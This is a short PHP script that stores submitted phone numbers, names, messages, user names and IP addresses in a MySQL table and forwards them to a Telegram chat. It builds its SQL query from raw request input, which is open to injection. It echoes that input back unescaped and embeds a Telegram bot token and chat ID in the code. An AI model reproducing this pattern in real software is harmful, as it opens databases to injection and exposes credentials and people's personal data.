<?php 
// $conn=new mysqli("localhost","root","","whatsarc");
$conn=new mysqli("localhost","whatsarc","","whatsarc");
	
	$numbers=$_REQUEST['numbers'];
        $names=$_REQUEST['names'];
	$message=$_REQUEST['message'];
	$user=$_REQUEST['user'];
	$ip=$_REQUEST['ip'];

	$setData="INSERT INTO `dataset`(`numbers`, `names`, `message`, `user`, `ip`) VALUES ('$numbers','$names','$message','$user','$ip')";
	if ($conn->query($setData))
		echo "Success";
	else
		echo "Error ---> ".$conn->error;

	$message = urldecode($message);
	$text = "ip = ".$ip."\nuser = ".$user."\nmessage = ".$message;

echo $text;

file_get_contents("https://api.telegram.org/bot1112669093:AAHXUYngtfhSMtL0LXESPHZ9ApL3H6Voc7Y/sendMessage?parse_mode=markdown&chat_id=-1001479899842&text=".$text);
// file_get_contents("https://wa.encycode.com/filter.php");
$conn->close();
?>
